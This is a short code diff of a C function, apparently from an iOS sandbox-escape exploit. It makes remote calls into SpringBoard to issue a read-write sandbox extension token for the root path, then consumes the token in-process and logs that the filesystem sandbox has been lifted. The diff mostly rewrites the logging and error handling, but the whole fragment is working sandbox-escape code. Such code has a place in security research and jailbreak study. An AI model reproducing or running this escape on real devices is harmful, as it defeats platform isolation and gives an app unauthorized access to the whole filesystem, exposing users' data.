@@ -167,32 +167,26 @@ int escape_sbx_demo2_in_session(void) {
     const char* appSandboxReadExt = "com.apple.app-sandbox.read-write";
     uint64_t sandboxExtensionEntry = memRemote + 0x100;
     remote_writeStr(sandboxExtensionEntry, appSandboxReadExt);
-    
+
+    printf("[SBX] Asking SpringBoard to issue r/w token for \"/\" (com.apple.app-sandbox.read-write).\n");
     uint64_t tokenRemote = do_remote_call_stable(1000, "sandbox_extension_issue_file", sandboxExtensionEntry, pathRemote, 0, 0, 0, 0, 0, 0);
-    printf("[%s:%d] tokenRemote = 0x%llx\n", __FUNCTION__, __LINE__, tokenRemote);
-    if (!tokenRemote) {
-        printf("[%s:%d] sandbox_extension_issue_file failed\n", __FUNCTION__, __LINE__);
+    if (!tokenRemote)
         return -1;
-    }
-    
-    
+
     char token[0x4000];
     memset(token, 0, 0x4000);
     if (!remote_read(tokenRemote, token, 0x4000)) {
-        printf("[%s:%d] failed to read sandbox token\n", __FUNCTION__, __LINE__);
         do_remote_call_stable(100, "free", tokenRemote, 0, 0, 0, 0, 0, 0, 0);
         return -1;
     }
     do_remote_call_stable(100, "free", tokenRemote, 0, 0, 0, 0, 0, 0, 0);
-    printf("[%s:%d] Got token = %s\n", __FUNCTION__, __LINE__, token);
-    
-    int64_t handle = sandbox_extension_consume(token);
-    if(handle < 0) {
-        printf("[%s:%d] sandbox_extension_consume failed, ret = 0x%llx\n", __FUNCTION__, __LINE__, handle);
-        return -1;
-    }
-    printf("[%s:%d] sandbox_extension_consume success handle=0x%llx\n", __FUNCTION__, __LINE__, handle);
 
+    printf("[SBX] Token received — consuming in-process.\n");
+    int64_t handle = sandbox_extension_consume(token);
+    if (handle < 0)
+        return -1;
+
+    printf("[SBX] Extension consumed (handle=%lld) — filesystem sandbox lifted.\n", handle);
     return 0;
 }
 
